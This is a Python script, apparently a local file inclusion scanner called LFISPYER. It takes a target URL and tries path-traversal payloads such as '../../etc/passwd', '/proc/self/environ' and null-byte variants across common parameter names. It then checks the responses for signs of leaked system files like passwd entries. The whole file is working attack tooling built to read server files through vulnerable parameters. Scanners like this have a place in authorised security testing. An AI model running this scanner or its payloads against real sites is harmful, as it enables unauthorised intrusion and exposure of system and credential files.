import requests
import time
import urllib.parse
from colorama import init, Fore, Style
import validators
import logging
import os

# Initialize colorama for cross-platform color support
init(autoreset=True)

# Set up logging to save results to a file
logging.basicConfig(
    filename='lfi_scan_results.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

print(r'''
         


 ▄█          ▄████████  ▄█     ▄████████    ▄███████▄ ▄██   ▄      ▄████████    ▄████████
███         ███    ███ ███    ███    ███   ███    ███ ███   ██▄   ███    ███   ███    ███
███         ███    █▀  ███▌   ███    █▀    ███    ███ ███▄▄▄███   ███    █▀    ███    ███
███        ▄███▄▄▄     ███▌   ███          ███    ███ ▀▀▀▀▀▀███  ▄███▄▄▄      ▄███▄▄▄▄██▀
███       ▀▀███▀▀▀     ███▌ ▀███████████ ▀█████████▀  ▄██   ███ ▀▀███▀▀▀     ▀▀███▀▀▀▀▀  
███         ███        ███           ███   ███        ███   ███   ███    █▄  ▀███████████
███▌    ▄   ███        ███     ▄█    ███   ███        ███   ███   ███    ███   ███    ███
█████▄▄██   ███        █▀    ▄████████▀   ▄████▀       ▀█████▀    ██████████   ███    ███
▀                                                                              ███    ███
''')
time.sleep(1)

# Expanded list of common LFI parameters
param_names = ["filename", "viewpage", "page", "file", "viewfile", "path", "document", "src", "include", "template"]

# Default payloads if none provided
default_payloads = [
    "../../etc/passwd",
    "../../windows/win.ini",
    "/etc/passwd",
    "/proc/self/environ",
    "../../../../../../etc/passwd%00",
    "../../../../../../windows/win.ini%00"
]

# Function to validate URL
def is_valid_url(url):
    return validators.url(url)

# Function to load payloads
def load_payloads(file_path):
    try:
        if not os.path.exists(file_path):
            logging.error(f"Payload file {file_path} not found. Using default payloads.")
            return default_payloads
        with open(file_path, "r", encoding="utf-8") as f:
            payloads = [line.strip() for line in f if line.strip()]
        if not payloads:
            logging.warning("Payload file is empty. Using default payloads.")
            return default_payloads
        return payloads
    except Exception as e:
        logging.error(f"Error loading payloads: {str(e)}. Using default payloads.")
        return default_payloads

# Input with validation
while True:
    target_url = input("Enter Targeted Website (e.g., http://example.com): ").strip()
    if is_valid_url(target_url):
        break
    print(Fore.RED + "[!!] Invalid URL. Please enter a valid URL (e.g., http://example.com).")

use_proxy = input("Use proxy? (y/n): ").strip().lower() == 'y'
proxy = None
if use_proxy:
    proxy_url = input("Enter proxy URL (e.g., http://127.0.0.1:8080): ").strip()
    proxy = {"http": proxy_url, "https": proxy_url}

custom_payload = input("Do You Have Specific Payload? (Enter payload or leave blank for default): ").strip()
if custom_payload:
    payloads = [custom_payload]
else:
    payloads = load_payloads("payloads.txt")

# Session for persistent connections
session = requests.Session()
if proxy:
    session.proxies = proxy

# LFI detection patterns (expanded)
lfi_patterns = [
    "root:x",  # Unix passwd file
    "daemon:x",  # Unix passwd file
    ":/bin/bash",  # Unix shell reference
    "[extensions]",  # Windows win.ini
    "HTTP_USER_AGENT",  # /proc/self/environ
    "include_once",  # PHP error exposing include
    "fopen(",  # PHP file open error
    "No such file or directory"  # Common LFI error message
]

# Scan loop
for payload in payloads:
    for param in param_names:
        try:
            # Encode payload to handle special characters
            encoded_payload = urllib.parse.quote(payload)
            url = f"{target_url}?{param}={encoded_payload}"
            
            # Send GET request
            response = session.get(url, timeout=10, allow_redirects=False)
            
            # Log and print request details
            log_message = f"URL: {url}, Status: {response.status_code}, Payload: {payload}, Param: {param}"
            print(f"[i] URL: {url}")
            print(f"[i] Param: {param}")
            print(f"[i] Payload: {payload}")
            print(f"[i] Status: {response.status_code}")
            logging.info(log_message)

            # LFI detection
            response_text = response.text.lower()
            for pattern in lfi_patterns:
                if pattern.lower() in response_text:
                    print(Fore.GREEN + f"[!!] Possible LFI detected! Pattern: {pattern}")
                    logging.warning(f"Possible LFI: {url} - Pattern: {pattern}")
                    # Continue scanning instead of exiting
                    break
            else:
                print(Fore.BLUE + f"    Response length: {len(response.text)}")
                logging.info(f"No LFI detected. Response length: {len(response.text)}")

            print("-" * 60)
        
        except requests.Timeout:
            print(Fore.RED + f"[!!] Timeout error for {url}")
            logging.error(f"Timeout error for {url}")
        except requests.ConnectionError:
            print(Fore.RED + f"[!!] Connection error for {url}")
            logging.error(f"Connection error for {url}")
        except requests.RequestException as e:
            print(Fore.RED + f"[!!] Request error for {url}: {str(e)}")
            logging.error(f"Request error for {url}: {str(e)}")
        except Exception as e:
            print(Fore.RED + f"[!!] Unexpected error for {url}: {str(e)}")
            logging.error(f"Unexpected error for {url}: {str(e)}")

# Close session
session.close()
print(Fore.CYAN + "[*] Scan completed. Results logged to 'lfi_scan_results.log'.")